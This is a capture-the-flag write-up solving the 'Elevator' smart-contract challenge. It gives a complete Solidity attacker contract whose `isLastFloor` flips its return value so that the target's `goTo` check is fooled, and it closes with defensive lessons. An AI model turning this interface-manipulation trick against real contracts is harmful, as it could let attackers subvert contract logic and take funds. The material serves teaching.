# Level 11: Elevator

## Challenge Overview

This challenge is designed to exploit the behavior of interfaces and state changes.  
The goal is to make the `goTo` function in the `Elevator` contract believe it has reached the top floor by manipulating the return value of an external contract’s function.

## Goal

Use an attacker contract to exploit the `isLastFloor` function and trick the `Elevator` contract into reaching the top floor.

## Solution

The `isLastFloor` function in the `Building` interface determines whether the elevator has reached the top floor.  
By creating a malicious contract, you can control the return value of `isLastFloor` to achieve the goal.

### Steps:

#### 1. Deploy an attacker contract with the following code:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IElevator {
    function goTo(uint _floor) external;
}

contract ElevatorAttack {
    bool public toggle = true;
    IElevator public elevator;

    constructor(address _elevatorAddress) {
        elevator = IElevator(_elevatorAddress);
    }

    function isLastFloor(uint) external returns (bool) {
        toggle = !toggle;
        return toggle;
    }

    function attack() public {
        elevator.goTo(1); // The floor number doesn't matter, pick one
    }
}
```

#### 2. Deploy the `ElevatorAttack` contract and pass the `Elevator` contract’s address as the target.

#### 3. Call the `attack` function with the desired floor:

```solidity
function attack() public {
    elevator.goTo(1); // The floor number doesn't matter, pick one
}
```

#### 4. Verify that the `Elevator` contract now considers itself at the top floor.

---

## Lessons Learned

1. The vulnerability exists because the `Building` interface function can change state between calls.  
   If `isLastFloor()` had been marked `view` or `pure`, this attack wouldn't work.

2. When designing contracts that make multiple calls to external functions,  
   consider whether those functions should maintain consistent return values for the same inputs.

3. Never trust external calls to behave consistently unless they’re properly restricted (e.g., with `view` or `pure` modifiers).
